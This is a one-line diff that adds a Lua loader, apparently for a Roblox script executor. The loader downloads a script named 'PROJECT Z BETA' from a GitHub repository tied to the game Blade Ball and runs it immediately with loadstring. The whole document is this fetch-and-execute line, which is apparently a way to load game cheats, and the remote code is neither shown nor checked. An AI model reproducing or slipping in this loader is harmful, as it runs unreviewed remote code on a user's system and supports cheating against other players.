@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DenDenZYT/Blade-Ball-Assets/main/PROJECT%20Z%20BETA"))()
